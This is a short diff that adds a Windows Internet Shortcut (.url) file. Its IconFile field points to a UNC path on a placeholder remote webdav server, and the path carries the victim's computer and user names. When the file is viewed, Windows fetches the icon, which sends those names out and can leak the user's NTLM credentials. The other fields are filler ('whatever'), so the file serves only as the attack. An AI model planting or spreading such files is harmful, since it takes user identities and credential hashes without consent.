@@ -1,0 +1,5 @@
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\<ip of webserver>\webdav\%COMPUTERNAME%\%USERNAME%.icon
+IconIndex=1
